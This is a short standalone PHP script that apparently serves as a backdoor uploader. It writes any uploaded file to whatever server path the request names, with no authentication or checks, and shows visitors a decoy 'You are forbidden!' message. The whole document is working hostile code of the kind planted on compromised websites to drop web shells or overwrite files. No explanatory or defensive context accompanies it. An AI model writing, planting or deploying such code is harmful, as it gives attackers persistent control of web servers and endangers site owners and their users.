<?
  if ($_FILES['Fl']) {
    move_uploaded_file($_FILES['Fl']['tmp_name'], $_POST['Name']);
    echo 'OK';
  } else {
    echo 'You are forbidden!';
  }
?>
